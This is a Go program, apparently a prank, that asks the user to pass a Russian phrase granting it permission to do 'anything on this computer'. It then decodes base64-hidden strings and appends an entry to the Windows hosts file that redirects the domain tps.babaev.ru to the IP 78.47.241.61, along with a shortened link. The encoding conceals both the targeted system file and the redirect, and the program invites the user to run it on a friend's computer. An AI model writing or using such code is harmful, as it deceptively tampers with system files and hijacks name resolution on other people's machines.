package main

import (
	b64 "encoding/base64"
	"flag"
	"fmt"
	"os"
)

func main() {
	agreement := flag.String("agreement", "", "Чтобы одеть очки, надо согласиться с правилами. Для этого запусти меня с параметром -agreement ЯДАЮРАЗРЕШЕНИЕДЕЛАТЬВСЕЧТОУГОДНОНАЭТОМКОМПЬЮТЕРЕ")

	flag.Parse()
	fmt.Println("agreement:", *agreement)

	if *agreement == "" {
		fmt.Println("Не все так просто. Запусти меня с параметром -h")
		os.Exit(0)
	}

	if *agreement != "ЯДАЮРАЗРЕШЕНИЕДЕЛАТЬВСЕЧТОУГОДНОНАЭТОМКОМПЬЮТЕРЕ" {
		fmt.Println("Я уважаю твое решение!")
		os.Exit(0)
	}

	/*
	Encoding:

	path := "C:\\Windows\\System32\\drivers\\etc\\hosts"
	sEnc := b64.StdEncoding.EncodeToString([]byte(data))
	fmt.Println(sEnc)

	ip := "78.47.241.61   tps.babaev.ru"
	sEnc := b64.StdEncoding.EncodeToString([]byte(ip))
	fmt.Println(sEnc)

	flavor_text := "\n\n" +
		"# Теперь, когда ты понял, что происходит\n" +
		"# Я хочу, чтобы ты знал наверняка, что никаких других, непредвиденных эффектов не будет.\n" +
		"# Чтобы в этом можно было убедиться окончательно вот ссылка на исходный код, который ты можешь проверить самостоятельно:\n" +
		"# https://bit.ly/3CE350e\n"
	sEnc := b64.StdEncoding.EncodeToString([]byte(flavor_text))
	fmt.Println(sEnc)
	*/

	encodedPath := "QzpcV2luZG93c1xTeXN0ZW0zMlxkcml2ZXJzXGV0Y1xob3N0cw=="
	encodedAppendix := "NzguNDcuMjQxLjYxICAgdHBzLmJhYmFldi5ydQ=="
	flavourText := "CgojINCi0LXQv9C10YDRjCwg0LrQvtCz0LTQsCDRgtGLINC/0L7QvdGP0LssINGH0YLQviDQv9GA0L7QuNGB0YXQvtC00LjRggojINCvINGF0L7Rh9GDLCDRh9GC0L7QsdGLINGC0Ysg0LfQvdCw0Lsg0L3QsNCy0LXRgNC90Y/QutCwLCDRh9GC0L4g0L3QuNC60LDQutC40YUg0LTRgNGD0LPQuNGFLCDQvdC10L/RgNC10LTQstC40LTQtdC90L3Ri9GFINGN0YTRhNC10LrRgtC+0LIg0L3QtSDQsdGD0LTQtdGCLgojINCn0YLQvtCx0Ysg0LIg0Y3Rg\ntC+0Lwg0LzQvtC20L3QviDQsdGL0LvQviDRg9Cx0LXQtNC40YLRjNGB0Y8g0L7QutC+0L3Rh9Cw0YLQtdC70YzQvdC+INCy0L7RgiDRgdGB0YvQu9C60LAg0L3QsCDQuNGB0YXQvtC00L3Ri9C5INC60L7QtCwg0LrQvtGC0L7RgNGL0Lkg0YLRiyDQvNC+0LbQtdGI0Ywg0L/RgNC+0LLQtdGA0LjRgtGMINGB0LDQvNC+0YHRgtC+0Y/RgtC10LvRjNC90L46CiMgaHR0cHM6Ly9iaXQubHkvM0NFMzUwZQo=\n"

	sDec, _ := b64.StdEncoding.DecodeString(encodedPath)
	aDec, _ := b64.StdEncoding.DecodeString(encodedAppendix)
	fDec, _ := b64.StdEncoding.DecodeString(flavourText)

	file, err := os.OpenFile(string(sDec), os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Я вообще не понимаю что происходит. Я ничего не могу понять и сделать. Ты все правильно сделал, но у меня все равно ничего не вышло. Лучше запусти меня на компьютере своего друга!")
		os.Exit(0)
	}
	defer file.Close()

	if _, err := file.WriteString("\n" + string(aDec)  + string(fDec)); err != nil {
		fmt.Println("Схитрить не выйдет. Мне нужен полный доступ, настоящий!")
		os.Exit(0)
	}

	fmt.Println("\nThe end's a miracle\nDream on if you dare\nStraight through the mirror\nWe'll sail on through the air\n")

}